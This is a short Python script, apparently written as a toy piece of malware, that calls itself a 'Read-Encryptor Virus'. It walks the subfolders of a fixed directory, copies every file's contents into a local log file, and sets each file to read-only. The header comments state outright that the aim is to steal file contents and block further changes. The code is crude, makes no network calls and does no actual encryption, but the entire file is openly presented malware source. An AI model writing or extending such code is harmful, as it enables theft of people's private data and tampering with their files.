# #### Virus-2: Read-Encryptor Virus
# Features: 
# 1. To steal the contents of all files 
# 2. To make the file read only and no further change is posible

import os
import numpy as np
from stat import S_IREAD, S_IRGRP, S_IROTH

def main():
    dr="D:/Execution/1/"
    os.chdir(dr)
    drlist=os.listdir(dr)
    ln=len(drlist)
    print(drlist)
    print(os.path.getsize(dr))
    des=[]
    try:
        logsteal=open(dr+"log2.txt","a+")
    except:
        logsteal=open(dr+"log2.txt","w+")
    for i in drlist:
        if os.path.isdir(dr+i)==True:
            des.append(1)
        else:
            des.append(0)
    print(des)
    for i in range(len(des)):
        if des[i]==1:
            drmod=dr+drlist[i]+"/"
            drmodlist=os.listdir(drmod)
            for j in drmodlist:
                filename=drmod+j
                data=open(filename,"r")
                content=data.read()
                logsteal=open(dr+"log2.txt","a+")
                logsteal.write("\n"+"Content of: "+filename+"\n"+content)
                logsteal.close()
                os.chmod(filename, S_IREAD|S_IRGRP|S_IROTH)
            

if __name__=="__main__":
    main()
